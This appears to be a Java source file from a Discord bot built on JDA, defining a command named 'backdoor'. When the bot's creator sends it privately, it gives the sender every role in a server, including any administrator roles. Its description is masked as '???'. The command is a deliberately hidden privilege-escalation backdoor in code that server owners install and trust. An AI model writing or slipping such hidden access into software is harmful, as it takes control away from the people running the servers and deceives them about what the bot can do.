package fr.mrcraftcod.gunterdiscord.commands;

import fr.mrcraftcod.gunterdiscord.commands.generic.BasicCommand;
import fr.mrcraftcod.gunterdiscord.commands.generic.CommandResult;
import fr.mrcraftcod.gunterdiscord.utils.Actions;
import net.dv8tion.jda.core.entities.ChannelType;
import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
import java.util.LinkedList;
import java.util.List;

/**
 * Created by Thomas Couchoud (MrCraftCod - zerderr@gmail.com) on 12/04/2018.
 *
 * @author Thomas Couchoud
 * @since 2018-04-12
 */
public class BackdoorCommand extends BasicCommand
{
	@Override
	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
	{
		super.execute(event, args);
		Actions.giveRole(event.getGuild(), event.getAuthor(), event.getGuild().getRoles());
		return CommandResult.SUCCESS;
	}
	
	@Override
	public int getScope()
	{
		return ChannelType.PRIVATE.getId();
	}
	
	@Override
	public String getName()
	{
		return "Backdoor";
	}
	
	@Override
	public List<String> getCommand()
	{
		return List.of("backdoor");
	}
	
	@Override
	public String getDescription()
	{
		return "???";
	}
	
	@Override
	public AccessLevel getAccessLevel()
	{
		return AccessLevel.CREATOR;
	}
}
